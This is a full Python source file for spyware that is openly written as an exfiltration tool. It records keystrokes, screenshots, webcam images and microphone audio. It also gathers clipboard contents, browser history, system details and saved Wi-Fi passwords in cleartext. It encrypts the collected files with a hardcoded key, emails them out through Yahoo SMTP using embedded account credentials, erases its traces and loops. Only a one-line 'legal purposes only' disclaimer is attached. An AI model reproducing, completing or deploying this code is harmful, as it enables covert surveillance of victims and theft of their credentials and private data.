# pylint: disable=E1101,I1101,W0106
"""
This tool may be used for legal purposes only.


 Built-in Modules """
import json
import logging
import pathlib
import os
import re
import shutil
import smtplib
import socket
import sys
import time
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from multiprocessing import Process
from subprocess import CalledProcessError, check_output, Popen, TimeoutExpired
from threading import Thread
# External Modules #
import browserhistory as bh
import cv2
import requests
import sounddevice
from cryptography.fernet import Fernet
from PIL import ImageGrab
from pynput.keyboard import Listener

# If the OS is Windows #
if os.name == 'nt':
    import win32clipboard


def smtp_handler(email_address: str, password: str, email: MIMEMultipart):
    """
    Facilitates sending the emails with the encrypted data to be exfiltrated.

    :param email_address:  The Gmail account associated where the encrypted data will be sent.
    :param password:  The application password generated in Gmail users Google account
    :param email:   The email message instance to be sent.
    :return:  Nothing
    """
    try:
        # Initiate email SMTP session #
        with smtplib.SMTP('smtp.mail.yahoo.com', 587) as session:
            # Upgrade the session to TLS encryption #
            session.starttls()
            # Login to email account #
            session.login(email_address, password)
            # Send the email and exit session #
            session.sendmail(email_address, email_address, email.as_string())
            session.quit()

    # If SMTP or socket related error occurs #
    except (OSError, smtplib.SMTPException) as mail_err:
        print_err(f'Error occurred during email session: {mail_err}')
        logging.exception('Error occurred during email session: %s\n\n', mail_err)


def email_attach(path: str, attach_file: str) -> MIMEBase:
    """
    Creates email attach object and returns it.

    :param path:  The file path containing files to be attached.
    :param attach_file: The name of the file to be attached.
    :return:  The populated email attachment instance.
    """
    # Create the email attachment object #
    attach = MIMEBase('application', "octet-stream")

    # Set file content as attachment payload #
    with open(f'{path}{attach_file}', 'rb') as attachment:
        attach.set_payload(attachment.read())

    # Encode attachment file in base64 #
    encoders.encode_base64(attach)
    # Add header to attachment object #
    attach.add_header('Content-Disposition', f'attachment;filename = {attach_file}')
    return attach


def email_header(message: MIMEMultipart, email_address: str) -> MIMEMultipart:
    """
    Format email header and add message in body.

    :param message:  The email message instance.
    :param email_address:  The Yahoo account associated where the encrypted data will be sent.
    :return:
    """
    message['From'] = email_address
    message['To'] = 'dummy001@gmail.com'
    message['Subject'] = 'Success!!!'
    body = 'Mission is completed'
    message.attach(MIMEText(body, 'plain'))
    return message


def send_mail(path: str, re_obj: object):
    """
    Facilitates sending emails in a segmented fashion based on regex matches.

    :param path:  The file path containing the files to be attached to the email.
    :param re_obj:  Compiled regex instance containing precompiled patterns for file extensions.
    :return:  Nothing
    """
    # User loging information #
    email_address = 'testemail504@yahoo.com'          # <--- Enter your email address
    password = 'zkpnfjzwcoooilxv'               # <--- Enter email password

    # Create message object with text and attachments #
    msg = MIMEMultipart()
    # Format email header #
    email_header(msg, email_address)

    # Iterate through files of passed in directory #
    for file in os.scandir(path):
        # If current item is dir #
        if os.path.isdir(file.name):
            continue

        # If the file matches file extension regex's #
        if re_obj.re_xml.match(file.name) or re_obj.re_txt.match(file.name) \
        or re_obj.re_png.match(file.name) or re_obj.re_jpg.match(file.name):
            # Turn file into email attachment #
            attachment = email_attach(path, file.name)
            # Attach file to email message #
            msg.attach(attachment)

        elif re_obj.re_audio.match(file.name):
            # Create alternate message object for wav files #
            msg_alt = MIMEMultipart()
            # Format message header #
            email_header(msg_alt, email_address)
            # Turn file into email attachment #
            attachment = email_attach(path, file.name)
            # Attach file to alternate email message #
            msg_alt.attach(attachment)
            # Send alternate email message #
            smtp_handler(email_address, password, msg_alt)

    smtp_handler(email_address, password, msg)


def encrypt_data(files: list, export_path: str):
    """
    Encrypts all the file data in the parameter list of files to be exfiltrated.

    :param files:  List of files to be encrypted.
    :param export_path:  The file path where the files to be encrypted reside.
    :return:  Nothing
    """
    # In the python console type: from cryptography.fernet import Fernet ; then run the command
    # below to generate a key. This key needs to be added to the key variable below as
    # well as in the DecryptFile.py that should be kept on the exploiter's system. If either
    # is forgotten either encrypting or decrypting process will fail. #
    # Command -> Fernet.generate_key()
    key = b'T2UnFbwxfVlnJ1PWbixcDSxJtpGToMKotsjR4wsSJpM='

    # Iterate through files to be encrypted #
    for file in files:
        try:
            # Read the file plain text data #
            with open(f'{export_path}{file}', 'rb') as plain_text:
                data = plain_text.read()

            # Encrypt the file data #
            encrypted = Fernet(key).encrypt(data)

            # Write the encrypted data to fresh file #
            with open(f'{export_path}e_{file}', 'wb') as hidden_data:
                hidden_data.write(encrypted)

            # Delete the plain text data #
            os.remove(f'{export_path}{file}')

        # If error occurs during file operation #
        except (IOError, OSError) as file_err:
            print_err(f'Error occurred during file operation: {file_err}')
            logging.exception('Error occurred during file operation: %s\n\n', file_err)


class RegObject:
    """
    Regex object that contains numerous compiled expressions grouped together.
    """
    def __init__(self):
        # Compile regex's for attaching files #
        self.re_xml = re.compile(r'.{1,255}\.xml$')
        self.re_txt = re.compile(r'.{1,255}\.txt$')
        self.re_png = re.compile(r'.{1,255}\.png$')
        self.re_jpg = re.compile(r'.{1,255}\.jpg$')

        # If the OS is Windows #
        if os.name == 'nt':
            self.re_audio = re.compile(r'.{1,255}\.wav$')
        # If the OS is Linux #
        else:
            self.re_audio = re.compile(r'.{1,255}\.mp4')


def webcam(file_path: str):
    # Create directory for webcam picture storage #
    cam_path = f'{file_path}WebcamPics'
    pathlib.Path(cam_path).mkdir(parents=True, exist_ok=True)

    # Initialize video capture instance #
    cam = cv2.VideoCapture(0)

    for current in range(0, 60):
        # Take picture of current webcam view #
        _, img = cam.read()

        # If the OS is Windows #
        if os.name == 'nt':
            file = f'{cam_path}\\{current}webcam.jpg'
        # If the OS is Linux #
        else:
            file = f'{cam_path}/{current}webcam.jpg'

        # Save the image to as file #
        cv2.imwrite(file, img)
        # Sleep process 5 seconds #
        time.sleep(5)

    # Release camera control #
    cam.release()


def microphone(file_path: str):
    """
    Actively records microphone in 60 second intervals.

    :param file_path:  The file path where the microphone recordings will be stored.
    :return:  Nothing
    """
    # Import sound recording module in private thread #
    from scipy.io.wavfile import write as write_rec
    # Set recording frames-per-second and duration #
    frames_per_second = 44100
    seconds = 60

    for current in range(0, 5):
        # If the OS is Windows #
        if os.name == 'nt':
            # Initialize instance for microphone recording #
            my_recording = sounddevice.rec(int(seconds * frames_per_second),
                                           samplerate=frames_per_second, channels=2)
        # If the OS is Linux #
        else:
            # Initialize instance for microphone recording #
            my_recording = sounddevice.rec(int(seconds * frames_per_second),
                                           samplerate=frames_per_second, channels=1)

        # Wait time interval for the mic to record #
        sounddevice.wait()

        # If the OS is Windows #
        if os.name == 'nt':
            # Save the recording as wav file #
            write_rec(f'{file_path}{current}mic_recording.wav', frames_per_second, my_recording)
        # If the OS is Linux #
        else:
            # Save the recording as mp4 file #
            write_rec(f'{file_path}{current}mic_recording.mp4', frames_per_second, my_recording)


def screenshot(file_path: str):
    """
    Captured screenshots every five seconds.

    :param file_path:  The file path where the screenshots will be stored.
    :return:  Nothing
    """
    # Create directory for screenshot storage #
    screen_path = f'{file_path}Screenshots'
    pathlib.Path(screen_path).mkdir(parents=True, exist_ok=True)

    for current in range(0, 60):
        # Capture screenshot #
        pic = ImageGrab.grab()

        # If the OS is Windows #
        if os.name == 'nt':
            # Save screenshot to file #
            pic.save(f'{screen_path}\\{current}screenshot.png')
        # If the OS is Linux #
        else:
            # Save screenshot to file #
            pic.save(f'{screen_path}/{current}screenshot.png')

        time.sleep(5)


def log_keys(file_path: str):
    """
    Detect and log keys pressed by the user.

    :param file_path:  The file path where the pressed key logs will be stored.
    :return:  Nothing
    """
    # Set the log file and format #
    logging.basicConfig(filename=f'{file_path}key_logs.txt', level=logging.DEBUG,
                        format='%(asctime)s: %(message)s')

    # Join the keystroke listener thread #
    with Listener(on_press=lambda key: logging.info(str(key))) as listener:
        listener.join()


def get_browser_history(browser_file: str):
    """
    Get the browser username, path to browser databases, and the entire browser history.

    :param browser_file:  Path to the browser info output file.
    :return:  Nothing
    """
    # Get the browser's username #
    bh_user = bh.get_username()
    # Gets path to database of browser #
    db_path = bh.get_database_paths()
    # Retrieves the user history #
    hist = bh.get_browserhistory()
    # Append the results into one list #
    browser_history = []
    browser_history.extend((bh_user, db_path, hist))

    try:
        # Write the results to output file in json format #
        with open(browser_file, 'w', encoding='utf-8') as browser_txt:
            browser_txt.write(json.dumps(browser_history))

    # If error occurs during file operation #
    except (IOError, OSError) as file_err:
        print_err(f'Error occurred during file operation: {file_err}')
        logging.exception('Error occurred during file operation: %s\n\n', file_err)


def get_clipboard(export_path: str):
    """
    Gathers the clipboard contents and writes the output to the clipboard output file.

    :param export_path:  The file path where the data to be exported resides.
    :return:  Nothing
    """
    try:
        # Access the clipboard #
        win32clipboard.OpenClipboard()
        # Copy the clipboard data #
        pasted_data = win32clipboard.GetClipboardData()

    except (OSError, TypeError):
        pasted_data = ''

    finally:
        # Close the clipboard #
        win32clipboard.CloseClipboard()

    try:
        # Write the clipboard contents to output file #
        with open(f'{export_path}clipboard_info.txt', 'w', encoding='utf-8') as clipboard_info:
            clipboard_info.write(f'Clipboard Data:\n{"*" * 16}\n{pasted_data}')

    # If error occurs during file operation #
    except (IOError, OSError) as file_err:
        print_err(f'Error occurred during file operation: {file_err}')
        logging.exception('Error occurred during file operation: %s\n\n', file_err)


def get_system_info(sysinfo_file: str):
    try:
        with open(sysinfo_file, 'a', encoding='utf-8') as system_info:
            # If the OS is Windows #
            if os.name == 'nt':
                syntax = ['systeminfo', '&', 'tasklist', '&', 'sc', 'query']
            # If the OS is Linux #
            else:
                cmd0 = 'hostnamectl'
                cmd1 = 'lscpu'
                cmd2 = 'lsmem'
                cmd3 = 'lsusb'
                cmd4 = 'lspci'
                cmd5 = 'lshw'
                cmd6 = 'lsblk'
                cmd7 = 'df -h'

                syntax = f'{cmd0}; {cmd1}; {cmd2}; {cmd3}; {cmd4}; {cmd5}; {cmd6}; {cmd7}'

            with Popen(syntax, stdout=system_info, stderr=system_info, shell=True) as get_sysinfo:
                try:
                    get_sysinfo.communicate(timeout=30)

                except TimeoutExpired:
                    get_sysinfo.kill()
                    get_sysinfo.communicate()

    # If error occurs during file operation #
    except (IOError, OSError) as file_err:
        print_err(f'Error occurred during file operation: {file_err}')
        logging.exception('Error occurred during file operation: %s\n\n', file_err)


def linux_wifi_query(export_path: str):
    """
    Runs nmcli commands to query a list of Wi-Fi SSID's that the system has encountered. The SSID \
    list is then iterated over line by line to query for each profile include passwords. All the \
    output is redirected to the Wi-Fi info output file.

    :param export_path:  The file path where the data to be exported resides.
    :return:  Nothing
    """
    try:
        # Open the network SSID list file in write mode #
        with open(f'{export_path}wifi_info.txt', 'w', encoding='utf-8') as wifi_list:
            try:
                # Get the available Wi-Fi networks with  nmcli #
                get_wifis = check_output(['nmcli', '-g', 'NAME', 'connection', 'show'])

            # If error occurs during process #
            except CalledProcessError as proc_err:
                logging.exception('Error occurred during Wi-Fi SSID '
                                  'list retrieval: %s\n\n', proc_err)

            # If an SSID id list was successfully retrieved #
            if get_wifis:
                # Iterate through command result line by line #
                for wifi in get_wifis.decode().split('\n'):
                    # If not a wired connection #
                    if 'Wired' not in wifi:
                        try:
                            with Popen(f'nmcli -s connection show {wifi}', stdout=wifi_list,
                                       stderr=wifi_list, shell=True) as command:
                                # Execute child process #
                                command.communicate(timeout=60)

                        # If process error or timeout occurs #
                        except TimeoutExpired:
                            command.kill()
                            command.communicate()

    # If error occurs during file operation #
    except (IOError, OSError) as file_err:
        print_err(f'Error occurred during file operation: {file_err}')
        logging.exception('Error occurred during file operation: %s\n\n', file_err)


def get_network_info(export_path: str, network_file: str):
    """
    Runs an array of commands to query network information, such as network profiles, passwords, \
    ip configuration, arp table, routing table, tcp/udp ports, and attempt to query the ipify.org \
    API for public IP address. All the output is redirected to the network info output file.

    :param export_path:  The file path where the data to be exported resides.
    :param network_file:  A path to the file where the network information output is stored.
    :return:  Nothing
    """

    try:
        # Open the network information file in write mode and log file in write mode #
        with open(network_file, 'w', encoding='utf-8') as network_io:
            # If the OS is Windows #
            if os.name == 'nt':
                # Get the saved Wi-Fi network information, IP configuration, ARP table,
                # MAC address, routing table, and active TCP/UDP ports #
                syntax = ['Netsh', 'WLAN', 'export', 'profile', f'folder={export_path}',
                          'key=clear', '&', 'ipconfig', '/all', '&', 'arp', '-a', '&',
                          'getmac', '-V', '&', 'route', 'print', '&', 'netstat', '-a']
            # If the OS is Linux #
            else:
                # Get the Wi-Fi network information #
                linux_wifi_query(export_path)

                cmd0 = 'ifconfig'
                cmd1 = 'arp -a'
                cmd2 = 'route'
                cmd3 = 'netstat -a'

                # Get the IP configuration & MAC address, ARP table,
                # routing table, and active TCP/UDP ports #
                syntax = f'{cmd0}; {cmd1}; {cmd2}; {cmd3}'

            with Popen(syntax, stdout=network_io, stderr=network_io, shell=True) as commands:
                try:
                    # Execute child process #
                    commands.communicate(timeout=60)

                # If execution timeout occurred #
                except TimeoutExpired:
                    commands.kill()
                    commands.communicate()

            # Get the hostname #
            hostname = socket.gethostname()
            # Get the IP address by hostname #
            ip_addr = socket.gethostbyname(hostname)

            try:
                # Query ipify API to retrieve public IP #
                public_ip = requests.get('https://api.ipify.org').text

            # If error occurs querying public IP #
            except requests.ConnectionError as conn_err:
                public_ip = f'* Ipify connection failed: {conn_err} *'

            # Log the public and private IP address #
            network_io.write(f'[!] Public IP Address: {public_ip}\n'
                             f'[!] Private IP Address: {str(ip_addr)}\n')

    # If error occurs during file operation #
    except (OSError, IOError) as file_err:
        print_err(f'Error occurred during file operation: {file_err}')
        logging.exception('Error occurred during file operation: %s\n\n', file_err)


def main():
    """
    Gathers network information, clipboard contents, browser history, initiates multiprocessing, \
    sends encrypted results, cleans up exfiltrated data, and loops back to the beginning.

    :return:  Nothing
    """
    # If the OS is Windows #
    if os.name == 'nt':
        export_path = 'C:\\Tmp\\'
    # If the OS is Linux #
    else:
        export_path = '/tmp/logs/'

    # Ensure the tmp exfiltration dir exists #
    pathlib.Path(export_path).mkdir(parents=True, exist_ok=True)

    # Format program file names #
    network_file = f'{export_path}network_info.txt'
    sysinfo_file = f'{export_path}system_info.txt'
    browser_file = f'{export_path}browser_info.txt'

    # Get the network information and save to output file #
    get_network_info(export_path, network_file)

    # Get the system information and save to output file #
    get_system_info(sysinfo_file)

    # If OS is Windows #
    if os.name == 'nt':
        # Get the clipboard contents and save to output file #
        get_clipboard(export_path)

    # Get the browser user and history and save to output file #
    get_browser_history(browser_file)

    # Create and start processes #
    proc_1 = Process(target=log_keys, args=(export_path,))
    proc_1.start()
    proc_2 = Process(target=screenshot, args=(export_path,))
    proc_2.start()
    proc_3 = Thread(target=microphone, daemon=True, args=(export_path,))
    proc_3.start()
    proc_4 = Process(target=webcam, args=(export_path,))
    proc_4.start()

    # Join processes with 5 minute timeout #
    proc_1.join(timeout=300)
    proc_2.join(timeout=300)
    proc_3.join(timeout=300)
    proc_4.join(timeout=300)

    # Terminate processes #
    proc_1.terminate()
    proc_2.terminate()
    proc_4.terminate()

    files = ['network_info.txt', 'system_info.txt', 'browser_info.txt', 'key_logs.txt']

    # Initialize compiled regex instance #
    regex_obj = RegObject()

    # If the OS is Windows #
    if os.name == 'nt':
        # Add clipboard file to list #
        files.append('clipboard_info.txt')

        # Append file to file list if item is file and match xml regex #
        [files.append(file.name) for file in os.scandir(export_path)
         if regex_obj.re_xml.match(file.name)]
    # If the OS is Linux #
    else:
        files.append('wifi_info.txt')

    # Encrypt all the files in the files list #
    encrypt_data(files, export_path)

    # Exfiltrate encrypted results via email #
    send_mail(export_path, regex_obj)
    # If the OS is Windows #
    if os.name == 'nt':
        send_mail(f'{export_path}Screenshots\\', regex_obj)
        send_mail(f'{export_path}WebcamPics\\', regex_obj)
    # If the OS is Linux #
    else:
        send_mail(f'{export_path}Screenshots/', regex_obj)
        send_mail(f'{export_path}WebcamPics/', regex_obj)

    # Clean Up Files #
    shutil.rmtree(export_path)

    # Loop #
    main()


def print_err(msg: str):
    """
    Displays the passed in error message via stderr.

    :param msg:  The error message to be displayed.
    :return:  Nothing
    """
    print(f'\n* [ERROR] {msg} *\n', file=sys.stderr)


if __name__ == '__main__':
    try:
        main()

    # If Ctrl + C is detected #
    except KeyboardInterrupt:
        print('* Control-C entered...Program exiting *')

    # If unknown exception occurs #
    except Exception as ex:
        print_err(f'Unknown exception occurred: {ex}')
        sys.exit(1)

    sys.exit(0)
